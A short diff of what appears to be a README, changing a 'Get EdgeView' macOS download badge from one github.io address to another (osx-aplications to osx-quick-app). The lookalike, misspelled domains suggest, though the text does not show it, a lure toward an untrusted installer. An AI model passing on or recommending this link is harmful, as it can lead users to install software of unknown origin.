@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/edgeview">
+  <a href="https://osx-quick-app.github.io/.github/edgeview">
     <img src="https://img.shields.io/badge/Get%20EdgeView-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get EdgeView">
   </a>
 </p>
